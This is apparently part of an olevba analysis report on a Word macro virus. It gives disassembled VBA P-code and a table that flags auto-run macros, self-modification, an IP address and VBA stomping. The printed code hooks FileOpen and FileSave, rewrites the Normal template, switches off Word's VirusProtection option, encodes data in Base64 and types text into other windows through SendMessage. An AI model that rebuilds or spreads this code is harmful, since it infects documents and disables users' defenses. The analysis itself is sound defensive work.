' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #410:
' 	EndWith 
' Line #411:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #412:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd New 
' 	Ld VBComp 
' 	MemLd New 
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #413:
' 	EndIfBlock 
' Line #414:
' 	EndIfBlock 
' Line #415:
' 	StartForVariable 
' 	Next 
' Line #416:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #417:
' Line #418:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #419:
' 	ArgsCall Tmsn 0x0000 
' Line #420:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #421:
' 	EndSub 
' Line #422:
' 	FuncDefn (Function Base64(FirstStr As String))
' Line #423:
' 	Dim 
' 	VarDefn i (As Long)
' Line #424:
' 	Dim 
' 	VarDefn ABC (As String)
' Line #425:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #426:
' 	Dim 
' 	VarDefn Char (As Byte)
' Line #427:
' 	Dim 
' 	VarDefn Cod (As Integer)
' Line #428:
' 	Dim 
' 	VarDefn Roll (As Integer)
' Line #429:
' 	Dim 
' 	VarDefn HMask (As Integer)
' Line #430:
' 	Dim 
' 	VarDefn LMask (As Integer)
' Line #431:
' 	Dim 
' 	VarDefn Shift (As Integer)
' Line #432:
' Line #433:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #434:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #435:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #436:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #437:
' 	LitStr 0x0040 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
' 	St ABC 
' Line #438:
' Line #439:
' 	OnError (Resume Next) 
' Line #440:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FirstStr 
' 	FnLen 
' 	For 
' Line #441:
' 	Ld FirstStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St Char 
' Line #442:
' 	Ld Char 
' 	Ld HMask 
' 	And 
' 	Paren 
' 	Ld LMask 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	IDiv 
' 	Paren 
' 	Ld Roll 
' 	Or 
' 	St Cod 
' Line #443:
' 	Ld Char 
' 	Ld LMask 
' 	And 
' 	Paren 
' 	Ld Shift 
' 	Mul 
' 	St Roll 
' Line #444:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Cod 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #445:
' 	Ld HMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x00FF 
' 	And 
' 	St HMask 
' Line #446:
' 	Ld LMask 
' 	LitDI2 0x0004 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	St LMask 
' Line #447:
' 	Ld Shift 
' 	LitDI2 0x0004 
' 	IDiv 
' 	St Shift 
' Line #448:
' 	Ld HMask 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #449:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #450:
' 	LitDI2 0x00FC 
' 	St HMask 
' Line #451:
' 	LitDI2 0x0003 
' 	St LMask 
' Line #452:
' 	LitDI2 0x0010 
' 	St Shift 
' Line #453:
' 	LitDI2 0x0000 
' 	St Roll 
' Line #454:
' 	EndIfBlock 
' Line #455:
' 	StartForVariable 
' 	Next 
' Line #456:
' Line #457:
' 	Ld Shift 
' 	LitDI2 0x0010 
' 	Lt 
' 	IfBlock 
' Line #458:
' 	Ld Tmp 
' 	Ld ABC 
' 	Ld Roll 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St Tmp 
' Line #459:
' 	EndIfBlock 
' Line #460:
' 	Ld Tmp 
' 	FnLen 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Paren 
' 	St Cod 
' Line #461:
' 	Ld Cod 
' 	IfBlock 
' Line #462:
' 	Ld Tmp 
' 	LitDI2 0x0004 
' 	Ld Cod 
' 	Sub 
' 	LitStr 0x0001 "="
' 	ArgsLd String$$ 0x0002 
' 	Add 
' 	St Tmp 
' Line #463:
' 	EndIfBlock 
' Line #464:
' 	Ld Tmp 
' 	St Base64 
' Line #465:
' 	EndFunc 
' Line #466:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #467:
' 	FuncDefn (Function Loto(i As Integer, A As ))
' Line #468:
' 	Dim 
' 	VarDefn n (As Integer)
' Line #469:
' 	LitDI2 0x0001 
' 	Ld i 
' 	RedimAs A 0x0001 (As Integer)
' Line #470:
' 	Dim 
' 	VarDefn Tmp (As Integer)
' Line #471:
' 	Dim 
' 	VarDefn Temp (As Integer)
' Line #472:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #473:
' 	Ld n 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #474:
' 	StartForVariable 
' 	Next 
' Line #475:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' Line #476:
' 	ArgsCall Read 0x0000 
' Line #477:
' 	Ld i 
' 	Ld n 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld n 
' 	Add 
' 	FnInt 
' 	St Tmp 
' Line #478:
' 	Ld n 
' 	ArgsLd A 0x0001 
' 	St Temp 
' Line #479:
' 	Ld Tmp 
' 	ArgsLd A 0x0001 
' 	Ld n 
' 	ArgsSt A 0x0001 
' Line #480:
' 	Ld Temp 
' 	Ld Tmp 
' 	ArgsSt A 0x0001 
' Line #481:
' 	StartForVariable 
' 	Next 
' Line #482:
' 	EndFunc 
' Line #483:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #484:
' Line #485:
' 	FuncDefn (Sub FileSave())
' Line #486:
' 	OnError (Resume Next) 
' Line #487:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #488:
' 	ArgsCall Sender_main 0x0000 
' Line #489:
' 	EndSub 
' Line #490:
' 	FuncDefn (Sub Tmsn())
' Line #491:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #492:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #493:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #494:
' 	Ld Friend 
' 	St NF 
' Line #495:
' 	OnError (Resume Next) 
' Line #496:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #497:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #498:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #499:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #500:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #501:
' 	Ld Delta 
' 	SelectCase 
' Line #502:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #503:
' 	ArgsCall Sender 0x0000 
' Line #504:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #505:
' 	ArgsCall Sender 0x0000 
' Line #506:
' 	CaseElse 
' Line #507:
' 	EndSelect 
' Line #508:
' 	EndSub 
' Line #509:
' 	FuncDefn (Sub Filler(MessStr As String, hwnd As Long))
' Line #510:
' 	Dim 
' 	VarDefn i (As Long)
' Line #511:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #512:
' 	Dim 
' 	VarDefn Charset (As Long)
' Line #513:
' 	OnError (Resume Next) 
' Line #514:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MessStr 
' 	FnLen 
' 	For 
' Line #515:
' 	Ld MessStr 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St Tmp 
' Line #516:
' 	Ld Tmp 
' 	SelectCase 
' Line #517:
' 	LitStr 0x0001 "#"
' 	CaseEq 
' 	CaseDone 
' Line #518:
' 	ArgsCall DoEvents 0x0000 
' Line #519:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	LitDI2 0x000D 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #520:
' 	LitStr 0x0001 "$"
' 	CaseEq 
' 	CaseDone 
' Line #521:
' 	LitDI2 0x0007 
' 	ArgsCall Pause 0x0001 
' Line #522:
' 	CaseElse 
' Line #523:
' 	Ld i 
' 	LitDI2 0x017C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #524:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #525:
' 	EndIfBlock 
' Line #526:
' 	Ld hwnd 
' 	LitHI2 0x0102 
' 	Ld Tmp 
' 	ArgsLd Asc 0x0001 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Charset 
' Line #527:
' 	EndSelect 
' Line #528:
' 	StartForVariable 
' 	Next 
' Line #529:
' 	EndSub 
' Line #530:
' Line #531:
' 	FuncDefn (Sub FileOpen())
' Line #532:
' 	OnError (Resume Next) 
' Line #533:
' 	ArgsCall AutoOpen 0x0000 
' Line #534:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #535:
' 	ArgsCall Sender_main 0x0000 
' Line #536:
' 	EndSub 
' Line #537:
' Line #538:
' Line #539:
' 	FuncDefn (Sub ToolsOptions())
' Line #540:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #541:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #542:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #543:
' 	EndWith 
' Line #544:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #545:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #546:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #547:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #548:
' 	EndWith 
' Line #549:
' 	EndSub 
' Line #550:
' Line #551:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |user32.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

